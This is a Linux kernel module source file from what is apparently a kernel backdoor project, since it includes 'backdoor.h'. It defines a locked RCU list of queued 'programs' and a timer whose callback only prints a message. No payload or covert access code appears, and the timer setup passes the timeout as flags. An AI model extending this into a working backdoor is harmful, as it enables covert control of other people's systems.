#include <linux/rculist.h>
#include <linux/timer.h>
#include "backdoor.h"

DEFINE_SPINLOCK(listmutex);

struct timer_list timer;

#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,15,0)
void execute_ready_programs(struct timer_list *tl){
	printk("Timeout: %lu\n", tl->expires);
}
#else
void execute_ready_programs(unsigned long timeout){
	printk("Timeout: %lu\n", timeout);
}
#endif

program *init_program(void){
	program *head = kmalloc(sizeof(struct program), GFP_KERNEL);
	memset(head, 0, sizeof(struct program));	
	INIT_LIST_HEAD(&(head->prog_list));
	return head;
}

int status(program *head){
	program *entry;

	rcu_read_lock();
	list_for_each_entry_rcu(entry, &(head->prog_list), prog_list) {
		if(entry->state == FINISHED) {
			rcu_read_unlock();
			return FINISHED;
		}
	}
	rcu_read_unlock();

	return READY;
}

void state_add(program **head, short int state, void *buffer, unsigned int length){
	program *entry = init_program();

	entry->state = state;
	entry->buffer = buffer;
	entry->length = length;

	spin_lock(&listmutex);
	list_add_rcu(&(entry->prog_list), &((*head)->prog_list));
	spin_unlock(&listmutex);
}

void create_timer(unsigned long timeout){
	/* https://lkml.org/lkml/2017/11/25/90 */
	#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,15,0)
		timer_setup(&timer, execute_ready_programs, timeout);
	#else
		setup_timer(&timer, execute_ready_programs, timeout);
	#endif
	
	mod_timer(&timer, jiffies + msecs_to_jiffies(timeout * 1000));
}

void destroy_timer(void){
	del_timer(&timer);
}
